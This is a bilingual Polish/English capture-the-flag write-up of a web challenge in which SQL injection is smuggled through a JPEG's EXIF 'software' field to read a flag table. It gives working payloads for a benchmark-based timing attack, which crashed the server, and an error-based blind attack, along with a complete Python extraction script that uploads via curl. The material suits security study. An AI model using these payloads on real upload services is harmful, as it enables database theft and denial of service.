﻿## limitless (web, 200p)

### pl

[eng](#eng-version)

w zadaniu dostajemy link do webowego uploadera plików, oraz informacje, że mamy wyciągnąć jakieś informacje z tabeli `flag`.
analiza uploadera oraz jego działania pozwala zauważyć, że uploader po załadowaniu pliku pobiera z niego dane `exif` a następnie na podstawie pola `exif.primary.software` wyszukuje w bazie danych oraz wyświetla zdjęcia utworzone tym samym oprogramowaniem.

zastosowaliśmy więc technikę `sql injection` poprzez pole exif, za pomocą skryptu:

```python
    img = pexif.jpegfile.fromfile("file.jpg")
    img.exif.primary.software = '"&&' + sql + '#'
    img.writefile('file.jpg')
```

który dopisywał nasze zapytanie do pliku i przygotowywał je do wykonania. zapytanie trafiało do klauzuli `where` zaraz za porównaniem ze stringiem. niestety mieliśmy twarde ograniczenie wynoszące 50 znaków dla tego pola exif, co mocno ograniczało nasze możliwości.
dodatkowo wykluczona była operacja union a tabela z której dokonywano selekcji miała 0 rekordów.

w związku z tym postanowiliśmy wykorzystać atak `remote timing` na bazę danych wraz z testowaniem pojedyńczych znaków jedynego elementu tabeli flags (gdzie spodziewaliśmy się flagi) - jeśli porównanie symbolu było niepoprawne wykonywaliśmy długo liczący się kod (sleep nie był dostępny). z racji małej liczby znaków nie mogliśmy użyć funkcji `substring` ani `mid`, musieliśmy opierać się o przesuwające się okno ze znamym fragmentem flagi. kod sql to:

```sql
benchmark(~-((select*from flag)like'%" + window + "%'),1)
```

funkcja benchmark wykonuje podany kod tyle razy ile wynosi pierwszy argument. w naszym przypadku wartość boolean jest zamieniana na liczbę za pomocą unarnego minusa a następnie bity są negowane. problem z tym rozwiązaniem polegał na tym, że taki benchmark wykonuje się bardzo (!) długo a w naszym kodzie uruchamiamy go dla każdego nie pasującego symbolu, więc dla każdego zgadywanego znaku pesymistycznie prawie 40 razy.

skutek był taki, że położyliśmy serwer 5 razy uzyskując raptem 2/3 flagi a organizatorzy postanowili zablokować funkcję benchmark.

nasze drugie podejście wykorzystało inny sposób - logowanie błędów mysql. użyliśmy zapytania:

```sql
rlike(if(mid((select*from flag),"+character_index+",1)='"+character+"','',1))
```

dzięki czemu w zależności od spełnienia warunku skrypt wykonywał się poprawnie lub zgłaszał błąd składniowy.
cały skrypt odzyskujący flagę:

```python
import pexif, subprocess

​def execute_sql(sql):
    img = pexif.jpegfile.fromfile("/var/www/html/img.jpg")
    img.exif.primary.software = '"' + sql + '#'
    img.writefile('/var/www/html/imgdest.jpg')
	return subprocess.check_output('curl -s -f submit=1 -f file=@/var/www/html/imgdest.jpg http://10.13.37.3', shell=true)

for i in range(1, 999):
    for c in (range(48, 58) + range(65, 91) + range(97, 126)):
        if 'expression' in execute_sql("rlike(if(mid((select*from flag),"+str(i)+",1)='"+chr(c)+"','',1))"):
            print chr(c),
            break
```

a jego wynik:

`dctf{09d5d8300a7adc45c5d434bb467f2a85}`

### eng version

in the task we get a link to a web file upoloader and an information that we need to extract some data from `flag` table.
analysis of the uploader and its behaviour reveals that the uploader, after loading the file, collected `exif` data and then based on `exif.primary.software` finds and displays other pictures made with the same software.

we used `sql injection` via exif field using script:

```python
    img = pexif.jpegfile.fromfile("file.jpg")
    img.exif.primary.software = '"&&' + sql + '#'
    img.writefile('file.jpg')
```

this script was adding the query to the file and preparing it for execution. the query was then placed in `where` clause, right after the comparison with a string. unfortunately we hade a hard limit of 50 characters for the query, which was a strong limiting factor. on top of that it was impossible to use `union` and the table on which the selection was executed had 0 rows.

therefore we decided to use `remote timing attack` on the database with testing single character of the sole element of flags table (where we expected to find the flag) - if the condition was not matching we were executing a long running task (sleep was unavailable). since the characters number limitation we could not use `substring` or `mid` functions and we had to relay on a moving window with known flag prefix/suffix. the sql code was:

```sql
benchmark(~-((select*from flag)like'%" + window + "%'),1)
```

benchmark function executes given code as many times as stated in the first argunent. in our case boolean is converted to int via unary minus and then bits are negated. the problem was that this benchmark executes really long (!) and in our code we we run it for every non matching symbol, so for any guessed character we might use almost 40 of those processes.

as a result we crashed the server 5 times and still got only 2/3 of the flag and organisers finally decided to block benchmark function.

our second attempt was using a different approach - exploiting errors in mysql. we used:

```sql
rlike(if(mid((select*from flag),"+character_index+",1)='"+character+"','',1))
```

and therefore the script would execute normally or crash with a syntax error, depending on the condition value.
whole script for extracting the flag:

```python
import pexif, subprocess

​def execute_sql(sql):
    img = pexif.jpegfile.fromfile("/var/www/html/img.jpg")
    img.exif.primary.software = '"' + sql + '#'
    img.writefile('/var/www/html/imgdest.jpg')
	return subprocess.check_output('curl -s -f submit=1 -f file=@/var/www/html/imgdest.jpg http://10.13.37.3', shell=true)

for i in range(1, 999):
    for c in (range(48, 58) + range(65, 91) + range(97, 126)):
        if 'expression' in execute_sql("rlike(if(mid((select*from flag),"+str(i)+",1)='"+chr(c)+"','',1))"):
            print chr(c),
            break
```

and the result.

`dctf{09d5d8300a7adc45c5d434bb467f2a85}`